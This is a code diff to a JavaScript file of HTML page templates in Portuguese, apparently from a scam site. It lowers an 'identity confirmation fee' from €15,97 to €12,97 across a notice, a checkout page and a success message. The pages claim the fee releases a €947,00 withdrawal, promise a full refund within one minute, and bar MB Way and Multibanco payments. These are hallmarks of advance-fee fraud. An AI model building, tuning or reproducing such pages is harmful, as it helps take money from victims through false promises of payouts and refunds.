@@ -120,13 +120,13 @@ const pages = {
           CONFIRMAÇÃO DE IDENTIDADE
         </div>
         <div class="confirmation-fee-amount">
-          € 15,97
+          € 12,97
           <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
         </div>
         <div class="confirmation-fee-description">
           Taxa obrigatória para liberação do saque no valor de
           <span class="bold">€947,00</span>. O valor de
-          <span class="bold">€15,97</span> será reembolsado integralmente
+          <span class="bold">€12,97</span> será reembolsado integralmente
           para ti em 1 minuto.
         </div>
       </div>
@@ -167,7 +167,7 @@ const pages = {
                 Pagar taxa de confirmação
               </div>
               <div class="confirmation-requirement-description">
-                € 15,97 para verificação de identidade
+                € 12,97 para verificação de identidade
               </div>
             </div>
           </div>
@@ -207,7 +207,7 @@ const pages = {
           ⏱️ Reembolso automático em 1 minuto
         </div>
         <div class="confirmation-success-message" id="confirmation-success-message">
-          ✅ Identidade confirmada. € 15,97 reembolsados e saque liberado.
+          ✅ Identidade confirmada. € 12,97 reembolsados e saque liberado.
         </div>
       </div>
 
@@ -295,17 +295,17 @@ const pages = {
       <div class="checkout-container">
         <div class="checkout-header">
           <h1>Pagamento da Taxa</h1>
-          <div class="amount">€15,97</div>
+          <div class="amount">€12,97</div>
         </div>
         <div class="checkout-content">
           <div class="checkout-summary">
             <div class="summary-row">
               <span>Taxa de verificação:</span>
-              <strong>€15,97</strong>
+              <strong>€12,97</strong>
             </div>
             <div class="summary-row total">
               <span>Total a pagar:</span>
-              <strong>€15,97</strong>
+              <strong>€12,97</strong>
             </div>
           </div>
           <div class="payment-methods-info">
@@ -319,7 +319,7 @@ const pages = {
             ⚠️ Os pagamentos por MB Way e Multibanco não são permitidos para a taxa de verificação de identidade, dado que estes métodos comprometem o processo de reembolso automático.
           </div>
           <button type="button" class="checkout-btn" id="checkout-btn">
-            Pagar €15,97
+            Pagar €12,97
           </button>
           <div class="checkout-error" id="checkout-error"></div>
         </div>
